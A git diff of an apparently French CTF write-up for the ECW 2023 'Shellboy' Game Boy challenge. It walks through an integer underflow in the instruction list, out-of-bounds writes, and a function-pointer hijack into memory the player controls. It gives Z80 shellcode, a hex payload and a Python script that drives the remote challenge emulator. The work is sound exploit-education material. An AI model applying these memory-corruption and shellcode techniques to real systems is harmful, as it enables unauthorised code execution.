@@ -2,7 +2,7 @@
 title: "[ECW 2023] - Shellboy"
 subtitle: ""
 date: 2023-11-01
-draft: true
+draft: false
 author: "LelBy"
 description: ""
 images: []
@@ -39,9 +39,6 @@ Dans ce jeu, nous pouvons définir une liste d'instruction permettant à notre p
 ![](images/ECW-2023/Pasted%20image%2020231112203458.png)
 
 ## Vulnérabilité
-- Vulnérabilité lors de la fusion de deux instructions
-- Permet de faire un underflow de la variable inst_count et de la rendre à 255 (0xFF)
-- Ecriture dans la mémoire entre 0 et 0xFF 
 
 En jouant un petit peut avec le jeu (en appuyant sur toute les touches comme un bourrin :joy:) , je me suis rendu compte d'un comportement anormale avec la fonctionnalité de fusion des instructions.
 
@@ -63,8 +60,8 @@ void move_inst(uint8_t inst1_index, uint8_t inst2_index)
     uint8_t inst1_id = inst_ids[inst1_index];
     uint8_t inst2_id = inst_ids[inst2_index];
     
-    ...
-
+    // ...
+    
     if(inst1_id == inst2_id)
     {
         uint16_t rpt_sum = inst1_rpt + inst2_rpt;
@@ -86,12 +83,12 @@ void move_inst(uint8_t inst1_index, uint8_t inst2_index)
     // Second case. IDs are differents, so we swap instructions
     else
     {
-        ...
+        // ...
     }
 }
 ```
 
-On remarque dans ce code, que lorsque deux instructions sont de même type, et que la somme de leur stack est inférieur à 255, alors on supprime la deuxième stack d'instructions. Or, dans notre cas, les instructions sont les même ! 
+On remarque dans ce code, que lorsque deux instructions sont de même type, et que la somme de leur répétition est inférieur à 255, alors on supprime la deuxième stack d'instructions. Or, dans notre cas, les instructions sont les même ! 
 
 ```c
 void remove_inst(uint8_t inst_index)
@@ -116,8 +113,7 @@ void remove_inst(uint8_t inst_index)
 Lorsque la stack d'instruction est supprimée, la variable globale `inst_count` est décrémentée. Mais ce n'est pas tout !
 
 ```c
-...
-	
+// ...
 // Remove the selected instruction
 else if(KEY_TRIGGERED(J_B) && !list_empty)
 {
@@ -125,9 +121,7 @@ else if(KEY_TRIGGERED(J_B) && !list_empty)
 	list_empty = inst_count == 0;
 	inst_cursor_pos = 0;
 }
-
-...
-	
+// ...	
 // Swap/Merge the selected instruction
 else if(KEY_TRIGGERED(J_SELECT) && !list_empty)
 {
@@ -145,7 +139,7 @@ else if(KEY_TRIGGERED(J_SELECT) && !list_empty)
 
 Lorsqu'on supprime normalement une instruction  avec la touche `B`, la variable `inst_cusror_pos` est remise à `0`. Si  `inst_count = 0`, alors `list_empty` devient `True`. 
 
-Cependant, dans notre cas, on remarque que la fonction `move_inst()` est appelée sans que `inst_count` ne soit vérifiée et `inst_cursor_pos` réinitialisée. Ce qui permet de pouvoir décrémenter `inst_count` et l'underflow pour la faire passer à `255`.
+Cependant,  on remarque que la fonction `move_inst()` est appelée sans que `inst_count` ne soit vérifiée et `inst_cursor_pos` réinitialisée. Ce qui permet de pouvoir décrémenter `inst_count` et l'underflow pour la faire passer à `255`, tandis que `inst_cursor_pos` reste à la même position.
 
 ```c
 // Select next instruction
@@ -169,108 +163,235 @@ Dans un cas normal, ces tableaux ont une taille maximale de 16. Cependant, la va
 
 ### Ecriture arbitraire
 
-Grâce à l'observation précédente, il est ainsi possible d'écrire des valeurs comprises entre `0` et `255` dans la mémoire, dans un espace compris entre le début de `inst_rpt` et `inst_rpt + 255`. 
+Grâce à l'observation précédente, il est ainsi possible d'écrire des valeurs comprises entre `0` et `255` dans la mémoire , entre `inst_rpt` et `inst_rpt + 255`. 
 
-Il va être ainsi nécessaire de déterminer le mapping des variables en mémoire.
+Il va être nécessaire de se faire une idée de l'emplacement des variables en mémoire pour exploiter cela.
 
 ### Représentation de la mémoire
-- Représentation de la mémoire 
 
+Cette capture montre la représentation en mémoire des variables : 
 
+![](images/ECW-2023/Pasted%20image%2020231113223153.png)
 
-## Execution de code
-- Ecriture en exploitant l'ID du type d'instruction pour décaler le pointeur de fonction
+Et le tableau avec les adresses :
+
+|                      Variable                      |     Adresse     |
+|:--------------------------------------------------:|:---------------:|
+|     <span style="color:red">inst_funcs[]</span>    | 0xC0B1 à 0xC0B8 |
+|   <span style="color:#045AFE">inst_rpt[]</span>    | 0xC0B9 à 0xC0C8 |
+|    <span style="color:#01df02">inst_ids[]</span>   | 0xC0C9 à 0xC0D8 |
+|    <span style="color:yellow">inst_count</span>    | 0xC0D9          |
+| <span style="color:fuchsia">inst_cursor_pos</span> | 0xC0DA          |
+| bot_x                                              | 0xC0E1          |
+| bot_y                                              | 0xC0E2          |
+
+## Exploitation
+
+### Exécution de code arbitraire
+
+Comme le décris ce petit morceau de code, le but du challenge est d'aller lire le flag à l'adresse `0x06FA`.
+
+```c
+// Check the final tile ID to check if the bot is on the flag
+if(final_tile_id == FLAG_TILE_ID) {
+	bnprintf(1, 4, 18, "Flag is at 0x06FA ");.
+```
+
+Une première idée était d'exploiter le tableau de pointeurs `inst_funcs[]` définis ci-dessous :
+
+```c
+bool (*inst_funcs[4])() = {
+    inst_go_up,
+    inst_go_right,
+    inst_go_down,
+    inst_go_left
+};
+```
+
+Cependant, `inst_func[]` est situé avant `inst_rpt[]`. On ne peut donc pas réécrire un pointeur de fonction. 
+
+Mais il est possible de regarder comment les fonctions sont appelées ! 
+
+```c
+void simulate() {
+	// ...
+	uint8_t inst_id = inst_ids[i];
+	uint8_t inst_rp = inst_rpt[i];
+	// ...
+	// Repeat the instruction n times
+	for(uint8_t j = 0; j < inst_rp; j++) {
+		if(inst_funcs[inst_id]()) {
+			// Draw only if the instruction succeeded
+			draw_simu();
+			delay(100);
+		}
+	}
+	// ...
+}
+```
+
+La fonction a appeler est récupérée dans `inst_func[]` grâce à l'id de l'instruction. Cette id est présent dans `inst_ids[]`. L'id d'une instruction est normalement compris entre `0` et `3`. 
+
+Si l'id a une valeur supérieur à `3`, alors, le pointeur de fonction récupéré est situé en dehors de `inst_func`, entre autre dans une zone que l'on contrôle, précisément au tout début de `int_rpt[]` !
+
+- `inst_func[0]` --> <span style="color:red">0xC0B1</span>
+- `inst_func[1]` -->  <span style="color:red">0xC0B3</span>
+- `inst_func[2]` --> <span style="color:red">0xC0B5</span>
+- `inst_func[3]` --> <span style="color:red">0xC0B7</span>
+- `inst_func[4]` --> <span style="color:#045AFE">0xC0B9</span>
+
+On peut le vérifier avec le désassemblé  : 
+
+```nasm
+; Z80 Instruction set
+; Load de l'id de l'instruction dans HL
+ram:0e4f 6e              LD         L,(HL)
+ram:0e50 26  00          LD         H,0x0
+ram:0e52 29              ADD        HL,HL
+; Load de l'adresse de base de inst_func dans DE
+ram:0e53 11  b1  c0      LD         DE,0xc0b1   
+; Calcul de l'adresse du pointeur à récupérer avec l'id de l'instruction
+ram:0e56 19              ADD        HL,DE
+; Load du pointeur de fonction dans HL
+ram:0e57 2a              LDI        A,(HL)  
+ram:0e58 66              LD         H, (HL)
+ram:0e59 6f              LD         L, A
+ram:0e5a c5              PUSH       BC
+; CALL inst_func --> JMP (HL)
+ram:0e5b cd  9a  13      CALL       inst_func                                   
+```
+
+Sachant que nous pouvons écrire dans `inst_ids[]` la valeur de l'id que l'on veut, il ne reste plus qu'à exploiter !
 
 ### Payload
-- Shellcode
 
-## Code finale
-- Code python d'exploitation
+L'idée générale est : 
 
-## Flag
+- Ecrire à partir de l'adresse `0xC0B9` (`inst_rpt[0]`) un pointeur de fonction qui pointe vers `0xC0BB` (`inst_rpt[2]`), car `inst_rpt` est un tableau de `uint_8`.
+- Ecrire notre shellcode pour afficher le flag à partir de l'adresse `0xC0BB`.
+- Ecrire la valeur `4` dans `inst_ids[0]` permettant de produire le comportement décris ci-dessus
+- Notre payload doit avoir une taille inférieur à 32 octets.
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-Possibilité de décrémenter `inst_count` pour la faire passer à 255, en faisant un select d'un index avec lui même
-
-`0xC0B9 to 0xC0C8`  --> inst_rpt[]
-`0xC0C9 to 0xC0D8 ` --> inst_ids[]
-`0xC0D9` --> inst_count
-`0xC0DA` --> inst_cursor_pos
-`0xC0DB` --> selected_index
-`0xC0E1` --> bot_x
-`0xC0E2` --> bot_y
-`0xC0E3` --> curr_keys
-`0xC0E4` --> prev_keys
-
-`0x139A` --> inst_funcs --> JP (HL)
-
-`0xC0B1` --> inst_funcs --> tableau de pointeurs de fonction
-
-Idée : Ecrire aux alentours de C0D0 pour controler la valeur que HL aura, soit H et L
-
-L'ID de la case peut être ``0x09`` par exemple, ce qui permet de récupérer notre pointeur custom à `0xC0C3`, car `0xC0B1 + 0x09*2` = `0xC0C3`, ou j'écris un pointeur vers mon shellcode.
-
-`0xC0B1 + 0x4*2 = 0xC0B9` --> inst_rpt[] --> On écrit `0xC0BB` qui pointe vers inst_rpt[2] (début du shellcode)
-
-Il y a un tableau de 4 pointeurs. cest pointeurs pointent vers les 4 fonctions de mouvement du bot. 
-En changeant l'id de la case, le programme va récupérer un pointeur qui est dans une zone de mémoire plus lointaine que celle initiale.
-Et cela tombe dans une zone de mémoire que on controle. Donc on change le pointeur vers une autre zone de mémoire ou on va placer notre shellcode !
-
-
-On décrémente `inst_count` pour qu'elle soit à `0xFF`
-On écrit dans inst_rpt[0] = 0xBB et inst_rpt[1] = 0xC0 ce qui permettra de `JMP (HL) avec HL = 0xC0BB`
-On écrit dans inst_ids[0] = 0x4, permet de load HL avec la valeur contenue dans `0xC0B9`
-
-Besoins de JMP relatif pour sauter dans la deuxième partie du shellcode.
-
-Payload : BBC0 
+Le shellcode permettant d'afficher le flag est le suivant : 
 
 ```
+; Push de l'adresse de flag
 11 FA 06 : LD DE, 0x06FA
 d5       : PUSH DE
+; Push des coordonnées
 21 04 12 : LD HL, 0x1204
 e5       : PUSH HL
+; Push de count
 3e 01    : LD A, 0x1
 f5       : PUSH AF
 33       : INC SP
+; Call de bnprintf (0xC010)
 cd c0 10 : CALL bnprintf
 E8 05    : ADD SP+5
+; Call de delay(2000)
 11 d0 F7 : LD DE, 0x7d0
 cd 9b 13 : CALL delay
-
 ```
 
-BB C0 11 FA 06 D5 21 04 12 E5 3E 01 F5 33 00 00 04 CD C0 10 E8 05 11 D0 F7 CD 9B 13
+Enfin, le payload en hexadécimale est le suivant :
 
+```py
+payload = [0xBB, 0xC0, 0x11, 0xFA, 0x06, 0xD5, 0x21, 0x04,
+             0x12, 0xE5, 0x3E, 0x01, 0xF5, 0x33, 0x00, 0x00,
+             0x04, 0xCD, 0xC0, 0x10, 0xE8, 0x05, 0x11, 0xD0,
+             0xF7, 0xCD, 0x9B, 0x13]
 ```
-        LAB_ram_0ea6                                    XREF[1]:     ram:0e8b (j)   
-        ram:0ea6 11  ec  0e      LD         DE,0xeec
-        ram:0ea9 d5              PUSH       DE=>s_Failed._Try_again._ram_0eec                = "Failed. Try again."
-        ram:0eaa 21  04  12      LD         HL,0x1204
-        ram:0ead e5              PUSH       HL=>LAB_ram_1204
-        ram:0eae 3e  01          LD         A,0x1
-        ram:0eb0 f5              PUSH       AF
-        ram:0eb1 33              INC        SP
-        ram:0eb2 cd  c0  10      CALL       bnprintf                                         undefined bnprintf(void)
-                E8 05                        ADD SP+5
-        ram:0eb7 11  d0  07       LD         DE,0x7d0
-        ram:0eba cd  9b  13       CALL       delay                                            undefined delay(short param_1)
+
+
+## Code finale
+
+Une fois notre payload construit, il ne reste plus qu'à interagir avec l'instance distante : 
+
+```py
+import requests
+import shutil
+
+BUTTON_RIGHT_ARROW  = 0x001
+BUTTON_LEFT_ARROW   = 0x002
+BUTTON_UP_ARROW     = 0x004
+BUTTON_DOWN_ARROW   = 0x008
+BUTTON_A            = 0x010
+BUTTON_B            = 0x020
+BUTTON_SELECT       = 0x040
+BUTTON_START        = 0x080
+BUTTON_RESET        = 0x100
+
+PORT = 40535
+HOST = "instances.challenge-ecw.fr"
+  
+shellcode = [0xBB, 0xC0, 0x11, 0xFA, 0x06, 0xD5, 0x21, 0x04,
+             0x12, 0xE5, 0x3E, 0x01, 0xF5, 0x33, 0x00, 0x00,
+             0x04, 0xCD, 0xC0, 0x10, 0xE8, 0x05, 0x11, 0xD0,
+             0xF7, 0xCD, 0x9B, 0x13]
+
+  
+def press_button(button: int):
+    """
+    Send a button press to the remote emulator
+    """
+    requests.get(f"http://{HOST}:{PORT}/setState?state={button}")
+    requests.get(f"http://{HOST}:{PORT}/setState?state=0")
+
+def save_frame(path: str):
+    """
+    Save the current frame to a PNG image
+    """
+    response = requests.get(f"http://{HOST}:{PORT}/render", stream=True)
+    response.raw.decode_content = True
+
+    with open(path, "wb") as f:
+        shutil.copyfileobj(response.raw, f)
+
+    print(f"[*] Frame saved at '{path}'")
+
+def main():
+
+    # Initialisation
+    press_button(BUTTON_RESET)
+    press_button(BUTTON_A)
+    press_button(BUTTON_LEFT_ARROW)
+    
+    # Make inst_count underflow to 0xFF
+    for i in range(0, 4):
+        press_button(BUTTON_SELECT)
+
+    index = 0
+    
+    # Writting payload byte per byte from inst_rpt[0]
+    for byte in shellcode:
+        print(f"[+] Writting bytes {hex(byte)} to inst_rpt[{index}]")
+
+        if byte < 0x7F:
+            for b in range(1, byte+1):
+                print(f"[INFO] Current value : {hex(b)} written in {index}")
+                press_button(BUTTON_UP_ARROW)
+                
+        else:
+            for b in range(0xFE, byte-1, -1):
+                print(f"[INFO] Current value : {hex(b)} written in {index}")
+                press_button(BUTTON_DOWN_ARROW)
+                
+        index += 1
+
+        if index == len(shellcode):
+            break
+        press_button(BUTTON_RIGHT_ARROW)
+
+    # Start simulation and get flag !
+    print("[+] Press Start button !")
+    press_button(BUTTON_START)
+
+if __name__ == "__main__":
+    main()
 ```
+
+## Flag
+
+Et voici le flag !
+
+![](images/ECW-2023/shellboy_flag.png)
